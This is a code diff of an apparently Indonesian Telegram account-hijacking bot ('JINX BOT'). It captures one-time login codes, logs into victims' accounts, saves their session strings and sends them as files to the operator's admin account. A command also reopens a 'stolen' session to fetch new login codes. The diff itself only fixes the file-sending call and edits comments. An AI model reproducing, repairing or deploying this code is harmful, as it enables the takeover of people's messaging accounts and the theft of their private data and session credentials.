@@ -18,12 +18,12 @@ listening = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 sessions = {}
 
-# === KIRIM FILE SESSION ===
+# === KIRIM FILE SESSION (SUDAH DIPERBAIKI!) ===
 async def send_session(phone, session_str):
     file_path = f"/tmp/{phone.replace('+','')}.session"
     with open(file_path, "w") as f:
         f.write(session_str)
-    await client.send_document(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")
+    await client.send_file(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")  # send_file!
     os.remove(file_path)
 
 # === /start_listener ===
@@ -68,7 +68,7 @@ async def auto_login(phone, code, source):
         session_str = temp.session.save()
         
         sessions[phone] = session_str
-        await send_session(phone, session_str)
+        await send_session(phone, session_str)  # Kirim file!
         
         await client.send_message(ADMIN_ID, f"""
 OTP: `{code}` ({source.upper()})
@@ -113,7 +113,7 @@ Nama: {me.first_name}
 Phone: `{phone}`
     """.strip())
 
-# === /new_otp → LANGSUNG MUNCUL KODE! (SUDAH DIPERBAIKI!) ===
+# === /new_otp → LANGSUNG MUNCUL KODE! ===
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     if event.sender_id != ADMIN_ID: return
@@ -122,7 +122,7 @@ async def new_otp(event):
         await event.reply("Session nggak ada!")
         return
     
-    session_str = sessions[phone]  # DI SINI SUDAH BENAR!
+    session_str = sessions[phone]
     stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await stolen.connect()
     await stolen.start()
@@ -157,4 +157,4 @@ JINX BOT
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX BOT JALAN – /new_otp LANGSUNG MUNCUL!")
+    print("JINX BOT JALAN – SESSION DIKIRIM OTOMATIS!")
